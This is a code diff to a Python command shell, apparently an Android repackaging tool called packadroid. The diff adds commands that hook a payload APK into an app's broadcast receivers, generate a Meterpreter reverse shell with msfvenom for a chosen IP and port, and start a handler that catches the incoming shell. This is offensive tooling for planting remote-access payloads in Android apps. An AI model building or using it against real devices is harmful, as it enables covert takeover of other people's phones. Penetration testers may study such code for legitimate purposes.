@@ -1,4 +1,5 @@
 import sys
+import subprocess
 
 from cmd import Cmd
 from packadroid.interactive_shell.packadroid_session import PackadroidSession
@@ -94,6 +95,45 @@ class PackadroidPrompt(Cmd):
             return ERR
         self.__packadroid_session.add_hook("activity", args[0], args[2], args[3], args[1])
         return SUC
+
+
+    def do_add_broadcast_hook(self, args):
+        """ Usage: add_activity_hook <broadcast> <payload_apk_path> <class> <method> -- Add a new hook to the given intent as a broadcastreceiver. """
+        args = args.split(" ")
+        if len(args) < 4:
+            print("Unknown format!")
+            return ERR
+        self.__packadroid_session.add_hook("broadcast", args[0], args[2], args[3], args[1])
+
+    def do_generate_meterpreter(self, args):
+        """ Usage: generate_meterpreter <IP> <lport> -- Generate a reverse shell (meterpreter) with given IP and port. Metasploit necessary! """
+        args = args.split(" ")
+        if len(args) != 2:
+            print("Unknown format!")
+            return ERR
+        
+        # is metasploit installed
+        proc = subprocess.Popen(["which msfvenom"], stdout=subprocess.PIPE, shell=True)
+        (out, err) = proc.communicate()
+        if out == "":
+            print("Metasploit is not installed! Please install Metasploit")
+            return ERR
+        self.__packadroid_session.generate_meterpreter(args[0], args[1])
+
+    def do_start_meterpreter_handler(self, args):
+        """ Usage: start_meterpreter_handler <IP> <lport> -- Generate a handler which is catchign the reverse shell """
+        args = args.split(" ")
+        if len(args) != 2:
+            print("Unknown format!")
+            return ERR
+        
+        # is metasploit installed
+        proc = subprocess.Popen(["which msfvenom"], stdout=subprocess.PIPE, shell=True)
+        (out, err) = proc.communicate()
+        if out == "":
+            print("Metasploit is not installed! Please install Metasploit")
+            return ERR
+        self.__packadroid_session.start_meterpreter_handler(args[0], args[1])
 
     def execute_commands(self, cmds):
         """
